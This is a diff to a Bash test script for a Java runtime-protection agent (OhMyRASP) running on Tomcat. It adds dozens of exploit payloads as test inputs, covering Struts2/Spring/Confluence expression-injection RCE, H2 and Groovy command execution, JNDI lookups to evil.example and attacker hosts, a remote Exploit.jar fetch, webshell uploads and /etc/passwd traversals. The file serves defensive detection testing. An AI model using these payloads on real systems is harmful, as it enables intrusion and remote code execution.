@@ -3,7 +3,7 @@ set -euo pipefail
 
 cd "$(dirname "$0")/.."
 
-versions=(9 10 11)
+versions=(11 10 9)
 declare -A baseline_ports=(
   [9]="${OHMYRASP_TOMCAT9_BASELINE_PORT:-18080}"
   [10]="${OHMYRASP_TOMCAT10_BASELINE_PORT:-18082}"
@@ -143,11 +143,20 @@ JSON
   local h2_console_jndi_url='ldap://127.0.0.1:9/Exploit'
   local log4shell_jndi_payload='${jndi:ldap://${sys:java.version}.example.com}'
   local shiro_default_rememberme_cookie='rememberMe=AAECAwQFBgcICQoLDA0OD99XrYvceC/RUMm6dUki3C8='
+  local hugegraph_default_jwt='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg'
+  local dataease_cve_2025_49001_jwt='eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5NzM5NTIzNDgzfQ.invalid'
+  local dataease_forged_jwt='eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsImV4cCI6OTczOTUyMzQ4M30.invalid'
+  local jsf_viewstate_payload='H4sIAAAAAAAAA1vzloG1AAAWmZJ6BQAAAA=='
   local spring_cve_2016_4977_response_type='${T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")}'
   local spring_cve_2017_4971_field='%5F%28new%20java.lang.ProcessBuilder%28%22bash%22%2C%22-c%22%2C%22id%22%29%29.start%28%29'
   local spring_cve_2017_8046_body
   spring_cve_2017_8046_body="$(cat <<'JSON'
 [{"op":"replace","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname","value":"vulhub"}]
+JSON
+)"
+  local spring_cve_2018_1270_stomp_body
+  spring_cve_2018_1270_stomp_body="$(cat <<'JSON'
+["SUBSCRIBE\nid:sub-0\ndestination:/topic/greetings\nselector:T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')\n\n\u0000"]
 JSON
 )"
   local spring_cve_2018_1273_field='username%5B%23this.getClass().forName(%22java.lang.Runtime%22).getRuntime().exec(%22touch%20%2Ftmp%2Fsuccess%22)%5D'
@@ -204,6 +213,125 @@ SQL
 }
 JSON
 )"
+  local druid_javascript_sampler_body
+  druid_javascript_sampler_body="$(cat <<'JSON'
+{
+  "type": "index",
+  "spec": {
+    "ioConfig": {
+      "type": "index",
+      "firehose": {
+        "type": "local",
+        "baseDir": "/etc",
+        "filter": "passwd"
+      }
+    },
+    "dataSchema": {
+      "dataSource": "test",
+      "parser": {
+        "parseSpec": {
+          "format": "javascript",
+          "timestampSpec": {},
+          "dimensionsSpec": {},
+          "function": "function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\\\A\").next();return {timestamp:123123,test: a}}",
+          "": {
+            "enabled": "true"
+          }
+        }
+      }
+    }
+  },
+  "samplerConfig": {
+    "numRows": 10
+  }
+}
+JSON
+)"
+  local hugegraph_gremlin_body
+  hugegraph_gremlin_body="$(cat <<'JSON'
+{
+  "gremlin": "Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"id\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");org.apache.commons.io.IOUtils.toString(startMethod.invoke(processBuilderInstance).getInputStream());",
+  "bindings": {},
+  "language": "gremlin-groovy",
+  "aliases": {}
+}
+JSON
+)"
+  local jira_contact_template
+  jira_contact_template="$(cat <<'TEXT'
+$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami').toString()
+TEXT
+)"
+  local unomi_context_mvel_body
+  unomi_context_mvel_body="$(cat <<'JSON'
+{
+  "filters": [
+    {
+      "id": "sample",
+      "filters": [
+        {
+          "condition": {
+            "parameterValues": {
+              "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/mvel\");"
+            },
+            "type": "profilePropertyCondition"
+          }
+        }
+      ]
+    }
+  ],
+  "sessionId": "sample"
+}
+JSON
+)"
+  local metabase_setup_validate_body
+  metabase_setup_validate_body="$(cat <<'JSON'
+{
+  "token": "setup-token",
+  "details": {
+    "is_on_demand": false,
+    "is_full_sync": false,
+    "is_sample": false,
+    "cache_ttl": null,
+    "refingerprint": false,
+    "auto_run_queries": true,
+    "schedules": {},
+    "details": {
+      "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
+      "advanced-options": false,
+      "ssl": true,
+      "init": "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('touch /tmp/success')\n$$"
+    },
+    "name": "an-sec-research-team",
+    "engine": "h2"
+  }
+}
+JSON
+)"
+  local spark_rest_submission_body
+  spark_rest_submission_body="$(cat <<'JSON'
+{
+  "action": "CreateSubmissionRequest",
+  "clientSparkVersion": "2.3.1",
+  "appArgs": [
+    "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
+  ],
+  "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
+  "environmentVariables": {
+    "SPARK_ENV_LOADED": "1"
+  },
+  "mainClass": "Exploit",
+  "sparkProperties": {
+    "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
+    "spark.driver.supervise": "false",
+    "spark.app.name": "Exploit",
+    "spark.eventLog.enabled": "true",
+    "spark.submit.deployMode": "cluster",
+    "spark.master": "spark://your-ip:6066"
+  }
+}
+JSON
+)"
   local fastjson_1224_body
   fastjson_1224_body="$(cat <<'JSON'
 {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.example:9999/TouchFile","autoCommit":true}}
@@ -233,8 +361,19 @@ JSON
   local struts2_s2046_boundary="----WebKitFormBoundaryXd004BVJN9pBYBL2"
   local struts2_s2046_filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}%00b"
   local struts2_s2046_body_file="logs/tomcat${version}-baseline/struts2-s2046.multipart"
+  local metersphere_plugin_jar_file="logs/tomcat${version}-baseline/metersphere-evil.jar"
   local struts2_ognl_runtime_payload="%{(#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('id'))}"
   local struts2_dollar_ognl_runtime_payload='${#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("id")}'
+  local ofbiz_groovy_program="throw new Exception('id'.execute().text);"
+  local ofbiz_groovy_program_unicode="throw new Exception('id'.\\u0065xecute().text);"
+  local ofbiz_remote_decorator_url="http://evil.com/ofbiz/payload.xml"
+  local ofbiz_viewdatafile_body='DATAFILE_LOCATION=http://attacker/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://attacker/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce'
+  local jenkins_checkscript_value='public class x { public x(){ "touch /tmp/success".execute() } }'
+  local aj_report_validation_rules_body
+  aj_report_validation_rules_body="$(cat <<'JSON'
+{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
+JSON
+)"
   local struts2_s2005_eval_query="%28%27%23rt.exec%28%22id%22%29%27%29%28%23rt%3D%40java.lang.Runtime%40getRuntime%28%29%29=1"
   local struts2_s2016_redirect_query="redirect:%24%7B%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D=1"
   local struts2_s2032_method_query="method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29=1&cmd=id"
@@ -242,13 +381,161 @@ JSON
   local struts2_s2061_boundary="----WebKitFormBoundaryl7d1B1aGsV2wcZwF"
   local struts2_s2061_payload='%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute.exec(#arglist))}'
   local struts2_s2061_body_file="logs/tomcat${version}-baseline/struts2-s2061.multipart"
+  local struts2_s2066_boundary="----OhMyRaspStruts2066"
+  local struts2_s2066_body_file="logs/tomcat${version}-baseline/struts2-s2066.multipart"
+  local struts2_s2067_boundary="----OhMyRaspStruts2067"
+  local struts2_s2067_body_file="logs/tomcat${version}-baseline/struts2-s2067.multipart"
+  local flink_cve_2020_17518_boundary="----WebKitFormBoundaryoZ8meKnrrso89R6Y"
+  local flink_cve_2020_17518_body_file="logs/tomcat${version}-baseline/flink-cve-2020-17518.multipart"
+  local struts2_s2015_action_path="/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D.action"
+  local struts2_s2052_xml_body
+  struts2_s2052_xml_body="$(cat <<'XML'
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+            <is class="javax.crypto.CipherInputStream">
+              <cipher class="javax.crypto.NullCipher">
+                <serviceIterator class="javax.imageio.spi.FilterIterator">
+                  <next class="java.lang.ProcessBuilder">
+                    <command>
+                      <string>touch</string>
+                      <string>/tmp/success</string>
+                    </command>
+                  </next>
+                </serviceIterator>
+              </cipher>
+            </is>
+          </dataSource>
+        </dataHandler>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+  </entry>
+</map>
+XML
+)"
+  local tomcat_cve_2025_24813_session_cookie="JSESSIONID=.deserialize"
   local confluence_cve_2021_26084_query_string
   confluence_cve_2021_26084_query_string="$(cat <<'EOF'
 \u0027+{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var p = new java.lang.ProcessBuilder(\u0022bash\u0022,\u0022-c\u0022,\u0022id\u0022);p.start()\u0027)}+\u0027
 EOF
 )"
+  local confluence_cve_2019_3396_macro_body
+  confluence_cve_2019_3396_macro_body="$(cat <<'JSON'
+{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":". /web.xml"}}}
+JSON
+)"
   local confluence_cve_2022_26134_path="/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
+  local confluence_cve_2023_22515_setup_query="bootstrapStatusProvider.applicationConfig.setupComplete=false"
+  local confluence_cve_2023_22527_body
+  confluence_cve_2023_22527_body="$(cat <<'EOF'
+label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))
+EOF
+)"
+  local metersphere_case_sort_body
+  metersphere_case_sort_body="$(cat <<'JSON'
+{
+  "orders": [
+    {
+      "name": "name",
+      "type": ",if(1=1,sleep(2),0)"
+    }
+  ],
+  "components": [
+    {
+      "key": "name",
+      "name": "MsTableSearchInput",
+      "label": "commons.name",
+      "operator": {
+        "value": "like"
+      }
+    },
+    {
+      "key": "reviewStatus",
+      "name": "MsTableSearchSelect",
+      "label": "test_track.review_view.execute_result"
+    }
+  ],
+  "filters": {
+    "reviewStatus": [
+      "Prepare",
+      "Pass",
+      "UnPass"
+    ]
+  },
+  "planId": "",
+  "nodeIds": [],
+  "selectAll": false,
+  "unSelectIds": []
+}
+JSON
+)"
+  local skywalking_graphql_body
+  skywalking_graphql_body="$(cat <<'JSON'
+{
+  "query": "query queryLogs($condition: LogQueryCondition) { queryLogs(condition: $condition) { total logs { serviceId serviceName isError content } } }",
+  "variables": {
+    "condition": {
+      "metricName": "sqli where 1=1 --",
+      "state": "ALL",
+      "paging": {
+        "pageSize": 10
+      }
+    }
+  }
+}
+JSON
+)"
+  local xxl_job_run_body
+  xxl_job_run_body="$(cat <<'JSON'
+{
+  "jobId": 1,
+  "executorHandler": "demoJobHandler",
+  "executorParams": "demoJobHandler",
+  "executorBlockStrategy": "COVER_EARLY",
+  "executorTimeout": 0,
+  "logId": 1,
+  "logDateTime": 1586629003729,
+  "glueType": "GLUE_SHELL",
+  "glueSource": "touch /tmp/success",
+  "glueUpdatetime": 1586699003758,
+  "broadcastIndex": 0,
+  "broadcastTotal": 0
+}
+JSON
+)"
+  local xxl_job_hessian_body='Hessian2:org.apache.commons.beanutils.BeanComparator'
+  local dataease_h2_datasource_configuration
+  dataease_h2_datasource_configuration="$(cat <<'JSON'
+{"jdbc":"jdbc:h2:mem:pwn;MODE=MSSQLServer;INIT=CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\"touch\",\"/tmp/pwned\"})\\; }$$\\;CALL EXEC()","username":"","password":"","driver":"org.h2.Driver"}
+JSON
+)"
+  local dataease_h2_datasource_configuration_b64
+  dataease_h2_datasource_configuration_b64="$(printf "%s" "$dataease_h2_datasource_configuration" | base64 | tr -d '\n')"
+  local dataease_h2_datasource_validate_body
+  dataease_h2_datasource_validate_body="$(cat <<JSON
+{"name":"p1","type":"h2","configuration":"${dataease_h2_datasource_configuration_b64}"}
+JSON
+)"
+  local ofbiz_xmlrpc_serialized_body
+  ofbiz_xmlrpc_serialized_body="$(cat <<'XML'
+<?xml version="1.0"?>
+<methodCall>
+  <methodName>performCommand</methodName>
+  <params>
+    <param>
+      <value>
+        <serializable>rO0ABXNyAA==</serializable>
+      </value>
+    </param>
+  </params>
+</methodCall>
+XML
+)"
   local nexus_cve_2024_4956_path="/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+  local glassfish_cve_2017_1000028_path="/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
   local weblogic_uddi_operator_url="http://172.19.0.2:6379/test%0D%0A%0D%0Aconfig%20set%20dir%20/etc/%0D%0Asave"
   local geoserver_jiffle_wps_body
   geoserver_jiffle_wps_body="$(cat <<'XML'
@@ -287,6 +574,10 @@ XML
 </soapenv:Envelope>
 XML
 )"
+  local weblogic_console_handle
+  weblogic_console_handle='com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('\''touch /tmp/success1'\'');")'
+  local weblogic_console_filesystemxml_handle
+  weblogic_console_filesystemxml_handle='com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")'
   local activemq_jolokia_body
   activemq_jolokia_body="$(cat <<'JSON'
 {"type":"exec","mbean":"org.apache.activemq:type=Broker,brokerName=localhost","operation":"addNetworkConnector(java.lang.String)","arguments":["static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"]}
@@ -295,6 +586,11 @@ JSON
   local activemq_jolokia_file_write_body
   activemq_jolokia_file_write_body="$(cat <<'JSON'
 {"type":"exec","mbean":"org.apache.logging.log4j2:type=LoggerContext,ctx=default","operation":"setConfigText","arguments":["<Configuration><Appenders><RollingRandomAccessFile name='RollingFile' fileName='/opt/activemq/webapps/admin/shell.jsp'/></Appenders></Configuration>","utf-8"]}
+JSON
+)"
+  local activemq_jolokia_jfr_copy_body
+  activemq_jolokia_jfr_copy_body="$(cat <<'JSON'
+{"type":"exec","mbean":"jdk.management.jfr:type=FlightRecorder","operation":"copyTo","arguments":["42","/opt/activemq/webapps/admin/shelljfr.jsp"]}
 JSON
 )"
   local activemq_fileserver_destination="file:///opt/activemq/webapps/api/s.jsp"
@@ -320,6 +616,11 @@ SOAP
   local coldfusion_amf_body_file="logs/tomcat${version}-baseline/coldfusion-amf-poc.bin"
   local coldfusion_metadata_payload='{"_metadata":{"classname":"../../../../../../../../proc/self/environ"}}'
   local coldfusion_locale_query="../../../../../../../../../../etc/passwd%00en"
+  local coldfusion_wddx_argumentcollection_body
+  coldfusion_wddx_argumentcollection_body="$(cat <<'XML'
+argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://java-chains:50389/Exploit</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>
+XML
+)"
   local liferay_jsonws_body='cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=o3lt8q1F&formDate=1585270368703&tableId=1&name=2&type=3&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3Aaced00057372003d636f6d2e6d6368%22%7D'
   local cas_webflow_body='username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=CAS4_ENCRYPTED_COMMONS_COLLECTIONS4_CLIENT_STATE&_eventId=submit&submit=LOGIN'
   printf "%s" "$coldfusion_amf_body_b64" | base64 -d > "$coldfusion_amf_body_file"
@@ -336,6 +637,34 @@ SOAP
     printf '%s\r\n' "$struts2_s2061_payload"
     printf -- "--%s--\r\n" "$struts2_s2061_boundary"
   } > "$struts2_s2061_body_file"
+  {
+    printf -- "--%s\r\n" "$struts2_s2066_boundary"
+    printf 'Content-Disposition: form-data; name="File"; filename="shell.jsp"\r\n'
+    printf 'Content-Type: application/octet-stream\r\n\r\n'
+    printf '<%% out.println(1); %%>\r\n'
+    printf -- "--%s\r\n" "$struts2_s2066_boundary"
+    printf 'Content-Disposition: form-data; name="fileFileName"\r\n\r\n'
+    printf '../shell.jsp\r\n'
+    printf -- "--%s--\r\n" "$struts2_s2066_boundary"
+  } > "$struts2_s2066_body_file"
+  {
+    printf -- "--%s\r\n" "$struts2_s2067_boundary"
+    printf 'Content-Disposition: form-data; name="file"; filename="shell.jsp"\r\n'
+    printf 'Content-Type: application/octet-stream\r\n\r\n'
+    printf '<%% out.println(1); %%>\r\n'
+    printf -- "--%s\r\n" "$struts2_s2067_boundary"
+    printf 'Content-Disposition: form-data; name="top.fileFileName"\r\n\r\n'
+    printf '../shell.jsp\r\n'
+    printf -- "--%s--\r\n" "$struts2_s2067_boundary"
+  } > "$struts2_s2067_body_file"
+  {
+    printf -- "--%s\r\n" "$flink_cve_2020_17518_boundary"
+    printf 'Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/success"\r\n'
+    printf 'Content-Type: application/octet-stream\r\n\r\n'
+    printf 'success\r\n'
+    printf -- "--%s--\r\n" "$flink_cve_2020_17518_boundary"
+  } > "$flink_cve_2020_17518_body_file"
+  printf 'PK\003\004metersphere-plugin-poc' > "$metersphere_plugin_jar_file"
 
   wait_for "tomcat${version}-baseline" "$baseline_url"
   wait_for "tomcat${version}-protected" "$protected_url"
@@ -355,6 +684,8 @@ SOAP
   expect_not_blocked "$version" baseline_command_config_injection "${baseline_url}/rasp/policy/command-config-injection"
   expect_not_blocked "$version" baseline_rocketmq_cve_2023_33246_filterserver_command "${baseline_url}/rasp/policy/command-rocketmq-cve-2023-33246-filterserver"
   expect_not_blocked "$version" baseline_file_read -G --data-urlencode "path=/etc/passwd" "${baseline_url}/rasp/file/read"
+  expect_not_blocked "$version" baseline_weblogic_weak_password_file_read -G --data-urlencode "path=/etc/passwd" "${baseline_url}/hello/file.jsp"
+  expect_not_blocked "$version" baseline_metabase_cve_2021_41277_geojson_file_url -G --data-urlencode "url=file:////etc/passwd" "${baseline_url}/api/geojson"
   expect_not_blocked "$version" baseline_write_config_path "${baseline_url}/rasp/policy/write-config-path"
   expect_not_blocked "$version" baseline_rocketmq_cve_2023_37582_namesrv_config_path "${baseline_url}/rasp/policy/write-rocketmq-cve-2023-37582-config-path"
   expect_not_blocked "$version" baseline_write_generated_script -G --data-urlencode "payload=${generated_script_payload}" "${baseline_url}/rasp/policy/write-generated-script"
@@ -363,9 +694,13 @@ SOAP
   expect_not_blocked "$version" baseline_upload_policy "${baseline_url}/rasp/policy/upload-script"
   expect_not_blocked "$version" baseline_upload_expression_filename "${baseline_url}/rasp/policy/upload-expression-filename"
   expect_not_blocked "$version" baseline_struts2_s2046_filename -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2046_boundary}" --data-binary "@${struts2_s2046_body_file}" "${baseline_url}/index.action"
+  expect_not_blocked "$version" baseline_struts2_cve_2017_5638_s2046_filename -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2046_boundary}" --data-binary "@${struts2_s2046_body_file}" "${baseline_url}/index.action"
   expect_not_blocked "$version" baseline_upload_traversal "${baseline_url}/rasp/policy/upload-traversal"
+  expect_not_blocked "$version" baseline_flink_cve_2020_17518_jar_upload -X POST -H "Content-Type: multipart/form-data; boundary=${flink_cve_2020_17518_boundary}" --data-binary "@${flink_cve_2020_17518_body_file}" "${baseline_url}/jars/upload"
   expect_not_blocked "$version" baseline_upload_java_archive "${baseline_url}/rasp/policy/plugin-upload"
+  expect_not_blocked "$version" baseline_metersphere_plugin_add_jar_upload -X POST -F "file=@${metersphere_plugin_jar_file};filename=Evil.jar;type=application/java-archive" "${baseline_url}/plugin/add"
   expect_not_blocked "$version" baseline_weblogic_ws_utc_jsp_upload -X POST -H "Content-Type: multipart/form-data; boundary=ohmyrasp" "${baseline_url}/ws_utc/resources/setting/keystore?filename=shell.jsp"
+  expect_not_blocked "$version" baseline_weblogic_cve_2018_2894_ws_utc_jsp_upload -X POST -H "Content-Type: multipart/form-data; boundary=ohmyrasp" "${baseline_url}/ws_utc/resources/setting/keystore?filename=shell.jsp"
   expect_not_blocked "$version" baseline_activemq_fileserver_put -X PUT --data-binary "<% out.println(1); %>" "${baseline_url}/fileserver/2.txt"
   expect_not_blocked "$version" baseline_activemq_fileserver_move -X MOVE -H "Destination: ${activemq_fileserver_destination}" "${baseline_url}/fileserver/2.txt"
   expect_not_blocked "$version" baseline_webdav_unsafe_destination "${baseline_url}/rasp/policy/webdav-unsafe-destination"
@@ -378,10 +713,14 @@ SOAP
   expect_not_blocked "$version" baseline_nacos_cve_2021_29442_derby_ops_code_sql -G --data-urlencode "sql=${nacos_derby_code_sql}" "${baseline_url}/nacos/v1/cs/ops/derby"
   expect_not_blocked "$version" baseline_mysql_jdbc -G --data-urlencode "url=${mysql_jdbc_url}" "${baseline_url}/rasp/jdbc/mysql"
   expect_not_blocked "$version" baseline_linkis_cve_2022_44645_mysql_datasource_connect -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$linkis_mysql_datasource_body" "${baseline_url}/api/rest_j/v1/data-source-manager/op/connect/json"
+  expect_not_blocked "$version" baseline_linkis_cve_2023_27987_mysql_datasource_connect -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$linkis_mysql_datasource_body" "${baseline_url}/api/rest_j/v1/data-source-manager/op/connect/json"
+  expect_not_blocked "$version" baseline_linkis_cve_2023_29215_mysql_datasource_connect -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$linkis_mysql_datasource_body" "${baseline_url}/api/rest_j/v1/data-source-manager/op/connect/json"
+  expect_not_blocked "$version" baseline_linkis_cve_2023_46801_mysql_datasource_connect -X POST -H "Content-Type: application/json;charset=UTF-8" --data-binary "$linkis_mysql_datasource_body" "${baseline_url}/api/rest_j/v1/data-source-manager/op/connect/json"
   expect_not_blocked "$version" baseline_path_confusion "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_path_confusion_dot_segment -G --data-urlencode "uri=/./admin" "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_shiro_cve_2010_3863_dot_segment_admin -G --data-urlencode "uri=/./admin" "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_shiro_cve_2020_1957_semicolon_traversal_admin -G --data-urlencode "uri=/xxx/..;/admin/" "${baseline_url}/rasp/policy/request-path-confusion"
+  expect_not_blocked "$version" baseline_spring_cve_2018_1271_path_normalization_reference -G --data-urlencode "uri=${nexus_cve_2024_4956_path}" "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_nexus_cve_2024_4956_encoded_slash_traversal -G --data-urlencode "uri=${nexus_cve_2024_4956_path}" "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_elasticsearch_cve_2015_3337_plugin_traversal -G --data-urlencode "uri=/_plugin/head/../../../../../../../../../etc/passwd" "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_elasticsearch_cve_2015_5531_snapshot_traversal -G --data-urlencode "uri=/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" "${baseline_url}/rasp/policy/request-path-confusion"
@@ -391,9 +730,12 @@ SOAP
   expect_not_blocked "$version" baseline_spring_cve_2022_22978_regex_requestmatcher_lf -G --data-urlencode "uri=/admin/%0atest" "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_spring_cve_2022_22978_regex_requestmatcher_cr -G --data-urlencode "uri=/admin/%0dtest" "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_path_confusion_lenient -G --data-urlencode "uri=/setup/setup-s/%2>%2>/%2>%2>/user-create.jsp" "${baseline_url}/rasp/policy/request-path-confusion"
+  expect_not_blocked "$version" baseline_openfire_cve_2008_6508_setup_traversal -G --data-urlencode "uri=/setup/setup-/../../user-create.jsp" "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_openfire_cve_2023_32315_unicode_setup_traversal -G --data-urlencode "uri=/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp" "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_path_confusion_overlong -G --data-urlencode "uri=/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" "${baseline_url}/rasp/policy/request-path-confusion"
+  expect_not_blocked "$version" baseline_glassfish_cve_2017_1000028_overlong_traversal -G --data-urlencode "uri=${glassfish_cve_2017_1000028_path}" "${baseline_url}/rasp/policy/request-path-confusion"
   expect_not_blocked "$version" baseline_path_confusion_ghostbits "${baseline_url}/rasp/policy/request-spring-jetty-ghostbits-path-confusion"
+  expect_not_blocked "$version" baseline_spring_cve_2025_41242_ghostbits_path_traversal "${baseline_url}/rasp/policy/request-spring-cve-2025-41242-ghostbits-path-traversal"
   expect_not_blocked "$version" baseline_flink_log_path_traversal "${baseline_url}/rasp/policy/request-flink-log-path-traversal"
   expect_not_blocked "$version" baseline_internal_resource "${baseline_url}/rasp/policy/request-internal-resource"
   expect_not_blocked "$version" baseline_jetty_cve_2021_28164_encoded_dot_webinf -G --data-urlencode "uri=/%2e/WEB-INF/web.xml" --data-urlencode "query=" "${baseline_url}/rasp/policy/request-internal-resource"
@@ -402,39 +744,65 @@ SOAP
   expect_not_blocked "$version" baseline_jetty_cve_2021_34429_nul_dot_webinf -G --data-urlencode "uri=/.%00/WEB-INF/web.xml" --data-urlencode "query=" "${baseline_url}/rasp/policy/request-internal-resource"
   expect_not_blocked "$version" baseline_jetty_cve_2021_34429_nul_dotdot_webinf -G --data-urlencode "uri=/a/b/..%00/WEB-INF/web.xml" --data-urlencode "query=" "${baseline_url}/rasp/policy/request-internal-resource"
   expect_not_blocked "$version" baseline_forged_include_attribute "${baseline_url}/rasp/policy/request-forged-include-attribute"
+  expect_not_blocked "$version" baseline_tomcat_cve_2020_1938_ghostcat_include "${baseline_url}/rasp/policy/request-tomcat-cve-2020-1938-ajp-include"
+  expect_not_blocked "$version" baseline_tomcat_cnvd_2020_10487_ghostcat_include "${baseline_url}/rasp/policy/request-tomcat-cve-2020-1938-ajp-include"
   expect_not_blocked "$version" baseline_polytype -G --data-urlencode "parser=fastjson" --data-urlencode "type=com.sun.rowset.JdbcRowSetImpl" "${baseline_url}/rasp/deserialize/polymorphic"
   expect_not_blocked "$version" baseline_fastjson_1224_autotype -X POST -H "Content-Type: application/json" --data-binary "$fastjson_1224_body" "${baseline_url}/fastjson"
